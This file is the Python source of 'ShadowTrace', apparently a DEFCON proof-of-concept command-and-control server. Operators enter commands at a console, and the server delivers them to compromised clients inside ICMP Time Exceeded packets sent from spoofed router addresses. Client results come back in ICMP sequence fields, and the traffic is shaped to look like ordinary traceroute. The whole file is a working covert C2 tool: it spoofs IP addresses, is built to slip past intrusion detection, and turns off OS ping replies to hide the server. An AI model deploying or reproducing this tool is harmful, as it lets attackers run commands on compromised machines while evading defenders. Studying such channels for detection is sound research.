#!/usr/bin/env python3
"""
ShadowTrace - C2 Server (PoC for DEFCON)
=========================================
Paper: High-Bandwidth Stealth C2 via Traceroute Mimicry and ICMP Time Exceeded

Sequence (slide figure):
  ping a.b.c.d (TTL=n+1) -> Time-Exceeded from a.b.c.d+1  [chunk 0]
  ping a.b.c.d (TTL=n+2) -> Time-Exceeded from a.b.c.d+2  [chunk 1]
  ...
  ping a.b.c.d (TTL=n+m) -> Time-Exceeded from a.b.c.d+m  [chunk m-1]
  ping a.b.c.d (TTL=n+m+1) -> Echo Reply from a.b.c.d     [done]

Usage:
  sudo python3 shadowtrace_server.py <SERVER_IP>
  e.g.: sudo python3 shadowtrace_server.py 192.168.1.100

Requirements:
  pip install scapy
  (libpcap NOT required - uses lfilter only)
"""

from scapy.all import IP, ICMP, Raw, send, sniff, conf
import struct
import time
import threading
import sys
import os
from collections import defaultdict
from datetime import datetime

# ========== Color output ==========
class C:
    RED    = "\033[91m"; GREEN  = "\033[92m"; YELLOW = "\033[93m"
    BLUE   = "\033[94m"; CYAN   = "\033[96m"; RESET  = "\033[0m"; BOLD = "\033[1m"

def log(tag, msg, color=C.RESET):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{color}[{ts}] [{tag}]{C.RESET} {msg}")

# ========== Protocol constants ==========
# Downstream (Server -> Client):
#   Outer IP.id  (16bit) = [Session ID: 4bit][Chunk Index: 10bit][Control Flag: 2bit]
#   Time Exceeded inner payload = actual data carrier (bandwidth amplification)
#
# Upstream (Client -> Server):
#   IP.id    (16bit) = [Session ID: 4bit][Chunk Index: 10bit][Control Flag: 2bit]
#   ICMP.seq (16bit) = actual data carrier  (paper Section 4.2: 32bit total)
#   Raw payload      = fixed OS ping pattern (no data embedded)

FLAG_DATA  = 0x0  # normal data / next chunk request
FLAG_ACK   = 0x1  # initial command request
FLAG_RETRY = 0x2  # retransmit request
FLAG_END   = 0x3  # final chunk

MAGIC_ICMP_ID    = 0x5354   # "ST" (ShadowTrace identifier)
INNER_CHUNK_SIZE = 512      # Time Exceeded inner payload chunk size (bandwidth amplification)


# ========== IP address utilities ==========

def ip_to_int(ip: str) -> int:
    parts = list(map(int, ip.split(".")))
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]

def int_to_ip(n: int) -> str:
    return f"{(n>>24)&0xFF}.{(n>>16)&0xFF}.{(n>>8)&0xFF}.{n&0xFF}"

def increment_ip(ip: str, offset: int) -> str:
    """a.b.c.d + offset  (slide: chunk i -> spoof IP = a.b.c.d+(i+1))"""
    return int_to_ip(ip_to_int(ip) + offset)


# ========== Encode / Decode ==========

def encode_ip_id(session_id: int, chunk_idx: int, flag: int) -> int:
    """IP.id (16bit) = [Session ID: 4bit][Chunk Index: 10bit][Flag: 2bit]"""
    return ((session_id & 0xF) << 12) | ((chunk_idx & 0x3FF) << 2) | (flag & 0x3)

def decode_ip_id(ip_id: int):
    session_id = (ip_id >> 12) & 0xF
    chunk_idx  = (ip_id >> 2)  & 0x3FF
    flag       = ip_id         & 0x3
    return session_id, chunk_idx, flag

def is_shadowtrace_packet(pkt) -> bool:
    return (pkt.haslayer(ICMP) and
            pkt.haslayer(IP) and
            pkt[ICMP].type == 8 and
            pkt[ICMP].id == MAGIC_ICMP_ID)


# ========== Server main class ==========

class ShadowTraceServer:
    def __init__(self, server_ip: str):
        self.server_ip = server_ip

        self.command_queue: list[str] = []
        self.queue_lock = threading.Lock()

        # Per-session command chunk store: {session_id: [chunk0, chunk1, ...]}
        self.session_chunks: dict[int, list[bytes]] = {}

        # Upstream receive buffer: {session_id: {chunk_idx: bytes}}
        # Paper Section 4.2: ICMP.seq 16bit is the data carrier
        self.rx_chunks: dict = defaultdict(dict)

        # PROBES_PER_TTL=3 -> same FLAG_ACK arrives 3 times.
        # Only process the first; suppress the rest.
        self.ack_in_progress: set[int] = set()

        # PROBES_PER_TTL=3 -> same FLAG_END arrives 3 times.
        # Only reassemble/print on the first; suppress the rest.
        self.end_processed: set[int] = set()

        # Tracks how many Time Exceeded packets have been sent per (session, chunk).
        # Used to defer session_chunks deletion until ALL probes have been answered,
        # so that probe 2 and 3 can still find session_chunks and get a TE response.
        # Key: (session_id, chunk_idx)  Value: send count
        self.te_send_count: dict[tuple, int] = {}

        # Expected number of probes per TTL.
        self.probes_per_ttl: int = 3

        # Number of downstream (command) chunks sent per session.
        # Phase 4 (result upload) spoof IP must continue the sequence from Phase 2,
        # so we offset by this count: spoof = server_ip + cmd_count + result_chunk_idx + 1
        self.session_cmd_chunk_count: dict[int, int] = {}

        # Sessions where all downstream command chunks have been sent (FLAG_END sent).
        # Used to route Phase 4 FLAG_DATA to CASE 4 even if session_chunks
        # has not been deleted yet (te_send_count still counting probe 2/3).
        self.downstream_done: set[int] = set()

        self.stats = {"tx_packets": 0, "rx_packets": 0, "sessions": 0}

    # ---- Downstream send (Server -> Client) ----

    def _send_time_exceeded(self, dst_ip: str, chunk_idx: int,
                             session_id: int, flag: int, data_chunk: bytes):
        """
        Send ICMP Time Exceeded

        Spoof IP = server_ip + (chunk_idx + 1)  <- matches slide figure exactly
          chunk 0 -> a.b.c.d+1
          chunk 1 -> a.b.c.d+2
          chunk m -> a.b.c.d+m+1

        Packet structure (RFC 792 compliant):
          [Outer IP: a.b.c.d+(i+1) -> client]   <- spoofs hop-i router
          [Outer ICMP Type=11 (Time Exceeded)]
          [Inner IP: server -> client]            <- RFC792 original IP header
          [Inner ICMP Type=8]                     <- RFC792 first 64 bits
          [PAYLOAD: command data]                 <- bandwidth amplification key:
                                                     IDS only inspects outer Type=11
        """
        spoof_ip    = increment_ip(self.server_ip, chunk_idx + 1)
        outer_ip_id = encode_ip_id(session_id, chunk_idx, flag)

        inner_icmp = ICMP(type=8, code=0, id=MAGIC_ICMP_ID, seq=chunk_idx)
        inner_ip   = (IP(src=self.server_ip, dst=dst_ip, ttl=1, id=outer_ip_id)
                      / inner_icmp / Raw(load=data_chunk))
        outer      = (IP(src=spoof_ip, dst=dst_ip, id=outer_ip_id)
                      / ICMP(type=11, code=0) / inner_ip)

        send(outer, verbose=0)
        self.stats["tx_packets"] += 1
        log("TX", f"Time-Exceeded  src={spoof_ip} (+{chunk_idx+1}) -> {dst_ip} "
                  f"chunk={chunk_idx:03d} flag={['DATA','ACK ','RTRY','END '][flag]} "
                  f"{len(data_chunk)}B", C.GREEN)

    def _send_echo_reply(self, dst_ip: str, icmp_id: int, icmp_seq: int):
        """
        Final Echo Reply: mimics traceroute completion.
        Slide: 'ping response from a.b.c.d' (sent from real server IP)
        """
        pkt = IP(src=self.server_ip, dst=dst_ip) / ICMP(type=0, id=icmp_id, seq=icmp_seq)
        send(pkt, verbose=0)
        self.stats["tx_packets"] += 1
        log("TX", f"Echo Reply     src={self.server_ip} -> {dst_ip} (traceroute completion mimicry)", C.CYAN)

    def _split_command(self, command: str) -> list[bytes]:
        cmd_bytes = command.encode("utf-8")
        chunks = [cmd_bytes[i:i+INNER_CHUNK_SIZE]
                  for i in range(0, len(cmd_bytes), INNER_CHUNK_SIZE)]
        return chunks if chunks else [b"\x00"]

    # ---- Upstream receive (Client -> Server) ----

    def _reassemble_rx(self, session_id: int) -> bytes | None:
        buf = self.rx_chunks[session_id]
        if not buf:
            return None
        return b"".join(buf[k] for k in sorted(buf.keys()))

    def handle_packet(self, pkt):
        """
        Receive handler (called via lfilter - no libpcap needed)

        Client request types:
          FLAG_ACK  chunk=0  : initial command request  -> send chunk 0
          FLAG_DATA chunk=i  : chunk i request          -> send chunk i
          FLAG_END  chunk=k  : upstream result final    -> send Echo Reply

        Upstream data extraction (paper Section 4.2):
          Read ICMP.seq (16bit) only as data carrier.
          Raw payload is fixed OS pattern - ignored.
        """
        if not is_shadowtrace_packet(pkt):
            return

        src_ip   = pkt[IP].src
        ip_id    = pkt[IP].id
        icmp_seq = pkt[ICMP].seq
        self.stats["rx_packets"] += 1

        session_id, chunk_idx, flag = decode_ip_id(ip_id)

        log("RX", f"Echo-Req  src={src_ip} TTL={pkt[IP].ttl:3d} "
                  f"session={session_id:X} chunk={chunk_idx:03d} "
                  f"flag={['DATA','ACK ','RTRY','END '][flag]}", C.YELLOW)

        # ================================================================
        # CASE 1: Initial command request (FLAG_ACK, chunk=0)
        # ================================================================
        if flag == FLAG_ACK and chunk_idx == 0:
            # Session init: run only on the FIRST of the 3 probes.
            if session_id not in self.ack_in_progress:
                self.ack_in_progress.add(session_id)
                self.end_processed.discard(session_id)
                self.stats["sessions"] += 1

                with self.queue_lock:
                    if not self.command_queue:
                        log("SRV", "No command in queue. Input via CLI.", C.BLUE)
                        self.ack_in_progress.discard(session_id)
                        return
                    cmd = self.command_queue.pop(0)

                chunks = self._split_command(cmd)
                self.session_chunks[session_id] = chunks
                self.session_cmd_chunk_count[session_id] = len(chunks)
                self.rx_chunks[session_id] = {}
                self.te_send_count[(session_id, 0)] = 0
                log("SRV", f"New session {session_id:X}: '{cmd}' -> {len(chunks)} chunks", C.GREEN)

            if session_id not in self.session_chunks:
                # Command queue was empty on first probe; nothing to send.
                return

            chunks   = self.session_chunks[session_id]
            flag_out = FLAG_END if len(chunks) == 1 else FLAG_DATA
            self._send_time_exceeded(src_ip, 0, session_id, flag_out, chunks[0])

            # Defer deletion: only delete session_chunks after all probes for this
            # chunk have been answered, so probe 2 and 3 also get a TE response.
            if flag_out == FLAG_END:
                self.downstream_done.add(session_id)  # Phase 4 probes must not hit CASE 2
                key = (session_id, 0)
                self.te_send_count[key] = self.te_send_count.get(key, 0) + 1
                if self.te_send_count[key] >= self.probes_per_ttl:
                    del self.session_chunks[session_id]
                    del self.te_send_count[key]

        # ================================================================
        # CASE 2: Next chunk request (FLAG_DATA, session active)
        #         Excluded once downstream delivery is complete (downstream_done).
        # ================================================================
        elif (flag == FLAG_DATA and
              session_id in self.session_chunks and
              session_id not in self.downstream_done):
            # Note: with PROBES_PER_TTL=3, server receives 3 FLAG_DATA per chunk
            # and sends 3 Time-Exceeded responses. This is correct traceroute
            # mimicry - each probe should receive a router response.
            # Client sniff count=1 picks up the first response.
            chunks = self.session_chunks[session_id]

            if chunk_idx < len(chunks):
                flag_out = FLAG_END if chunk_idx == len(chunks) - 1 else FLAG_DATA
                self._send_time_exceeded(src_ip, chunk_idx, session_id,
                                         flag_out, chunks[chunk_idx])

                # Defer deletion until all probes for the final chunk are answered.
                if flag_out == FLAG_END:
                    self.downstream_done.add(session_id)
                    key = (session_id, chunk_idx)
                    self.te_send_count[key] = self.te_send_count.get(key, 0) + 1
                    if self.te_send_count[key] >= self.probes_per_ttl:
                        del self.session_chunks[session_id]
                        del self.te_send_count[key]

            else:
                # All chunks delivered -> send Final Echo Reply
                log("SRV", "All chunks delivered. Sending Final Echo Reply.", C.CYAN)
                self._send_echo_reply(src_ip, pkt[ICMP].id, pkt[ICMP].seq)
                del self.session_chunks[session_id]

        # ================================================================
        # CASE 3: Upstream final chunk (result data complete)
        # ================================================================
        elif flag == FLAG_END:
            # Send Echo Reply for EVERY probe (real traceroute: each of 3
            # probes gets a router response). Must happen BEFORE the
            # end_processed gate, which only guards reassemble+print.
            self._send_echo_reply(src_ip, pkt[ICMP].id, pkt[ICMP].seq)

            # Reassemble and print only on the first probe.
            if session_id in self.end_processed:
                return
            self.end_processed.add(session_id)

            # Paper Section 4.2: ICMP.seq 16bit is the only data carrier
            self.rx_chunks[session_id][chunk_idx] = struct.pack(">H", icmp_seq & 0xFFFF)

            full = self._reassemble_rx(session_id)
            self.rx_chunks[session_id] = {}

            if full:
                decoded = full.decode("utf-8", errors="replace").rstrip("\x00")
                print(f"\n{C.BLUE}{'='*60}{C.RESET}")
                print(f"{C.BOLD}{C.BLUE}[RESULT from {src_ip}]{C.RESET}")
                print(f"{C.BLUE}{'='*60}{C.RESET}")
                print(decoded)
                print(f"{C.BLUE}{'='*60}{C.RESET}\n")

            # Session fully complete; allow reuse of session_id on next ACK
            self.ack_in_progress.discard(session_id)
            self.downstream_done.discard(session_id)
            self.session_cmd_chunk_count.pop(session_id, None)

        # ================================================================
        # CASE 4: Upstream intermediate data chunk (FLAG_DATA, no active session)
        # ================================================================
        elif flag == FLAG_DATA and session_id not in self.session_chunks:
            # Accumulate the data carrier (ICMP.seq 16bit, paper Section 4.2).
            self.rx_chunks[session_id][chunk_idx] = struct.pack(">H", icmp_seq & 0xFFFF)

            # Send Time Exceeded to maintain continuous traceroute appearance.
            # Phase 2 used spoof IPs: server_ip+1 ... server_ip+N  (N = cmd chunks)
            # Phase 4 continues:      server_ip+N+1, server_ip+N+2, ...
            # All PROBES_PER_TTL probes in the same TTL hop must use the same spoof IP,
            # so use hop_idx = chunk_idx // PROBES_PER_TTL instead of chunk_idx directly.
            cmd_count = self.session_cmd_chunk_count.get(session_id, 0)
            hop_idx   = chunk_idx // self.probes_per_ttl
            spoof_idx = cmd_count + hop_idx
            self._send_time_exceeded(src_ip, spoof_idx, session_id, FLAG_DATA, b"")

        elif flag == FLAG_RETRY:
            log("RX", f"Retry requested for chunk {chunk_idx}", C.RED)

    # ---- CLI ----

    def cli_thread(self):
        print(f"\n{C.BOLD}=== ShadowTrace C2 Server CLI ==={C.RESET}")
        print("Type a command and press Enter -> sent on client's next poll")
        print("  'stats'  : show statistics")
        print("  'queue'  : show command queue")
        print("  'clear'  : clear command queue")
        print("  'exit'   : quit\n")

        while True:
            try:
                cmd = input(f"{C.GREEN}C2> {C.RESET}").strip()
                if not cmd:
                    continue
                if cmd == "stats":
                    print(f"  TX packets : {self.stats['tx_packets']}")
                    print(f"  RX packets : {self.stats['rx_packets']}")
                    print(f"  Sessions   : {self.stats['sessions']}")
                elif cmd == "queue":
                    with self.queue_lock:
                        print("  (empty)" if not self.command_queue else
                              "\n".join(f"  [{i}] {c}"
                                        for i, c in enumerate(self.command_queue)))
                elif cmd == "clear":
                    with self.queue_lock:
                        self.command_queue.clear()
                    print("  Queue cleared.")
                elif cmd == "exit":
                    os._exit(0)
                else:
                    with self.queue_lock:
                        self.command_queue.append(cmd)
                    log("CLI", f"Queued: '{cmd}'", C.GREEN)
            except (EOFError, KeyboardInterrupt):
                os._exit(0)

    def run(self):
        if os.geteuid() != 0:
            print(f"{C.RED}[ERROR] Root privileges required (sudo){C.RESET}")
            sys.exit(1)

        # Without this, the OS sends an Echo Reply AND server.py sends Time Exceeded
        # for the same probe -> double response -> traceroute mimicry breaks.
        # With this set, server.py has full control:
        #   Phase 2: Time Exceeded only (looks like a real intermediate router)
        #   Phase 4: Echo Reply only    (looks like a real ping destination)
        SYSCTL_PATH = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
        try:
            with open(SYSCTL_PATH) as f:
                _original_icmp_ignore = f.read().strip()
            with open(SYSCTL_PATH, "w") as f:
                f.write("1\n")
            log("SRV", "icmp_echo_ignore_all set to 1 (OS auto-reply disabled)", C.CYAN)
        except OSError as e:
            log("SRV", f"WARNING: could not set icmp_echo_ignore_all: {e}", C.RED)
            _original_icmp_ignore = None

        def _restore_icmp():
            if _original_icmp_ignore is not None:
                try:
                    with open(SYSCTL_PATH, "w") as f:
                        f.write(_original_icmp_ignore + "\n")
                    log("SRV", f"icmp_echo_ignore_all restored to {_original_icmp_ignore}", C.CYAN)
                except OSError:
                    pass

        import atexit
        atexit.register(_restore_icmp)

        conf.verb = 0
        print(f"\n{C.BOLD}{C.CYAN}ShadowTrace C2 Server{C.RESET}")
        print(f"  Server IP      : {self.server_ip}")
        print(f"  Spoof IP range : {increment_ip(self.server_ip, 1)} ~ (+1 per chunk)")
        print(f"  Magic ICMP ID  : 0x{MAGIC_ICMP_ID:04X}")
        print(f"  Inner chunk    : {INNER_CHUNK_SIZE}B/packet (bandwidth amplification)")
        print(f"  OS ICMP reply  : disabled (icmp_echo_ignore_all=1, restored on exit)")
        print(f"  libpcap        : NOT required (lfilter only)\n")

        t = threading.Thread(target=self.cli_thread, daemon=True)
        t.start()

        log("SRV", "Sniffing ICMP Echo Requests (lfilter, no BPF)...", C.CYAN)

        # Phase 1 handler: client sends real traceroute probes with id=0xDEAD (not MAGIC_ICMP_ID).
        # With icmp_echo_ignore_all=1, the OS no longer auto-replies to these.
        # Without a reply, the client's Phase 1 trace never shows Echo Reply at the
        # destination hop - real traceroute always does. Reply here to restore that behavior.
        def _is_any_echo(pkt) -> bool:
            return (pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and
                    pkt.haslayer(IP) and pkt[IP].dst == self.server_ip)

        def _dispatch(pkt):
            if pkt[ICMP].id == MAGIC_ICMP_ID:
                self.handle_packet(pkt)
            else:
                # Phase 1 plain probe (id != MAGIC_ICMP_ID).
                # Send Time Exceeded from server_ip so the server appears as an
                # intermediate hop, not the destination.  A real traceroute destination
                # would return Echo Reply, but ShadowTrace must NOT reveal the C2 IP
                # as the final hop - it stays hidden behind the spoofed-router sequence.
                inner = (IP(src=pkt[IP].dst, dst=pkt[IP].src, ttl=1)
                         / pkt[ICMP])
                te = (IP(src=self.server_ip, dst=pkt[IP].src)
                      / ICMP(type=11, code=0)
                      / inner)
                send(te, verbose=0)

        sniff(lfilter=_is_any_echo,
              prn=_dispatch,
              store=0)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <SERVER_IP>")
        print(f"  e.g.: sudo python3 {sys.argv[0]} 192.168.1.100")
        sys.exit(1)

    ShadowTraceServer(sys.argv[1]).run()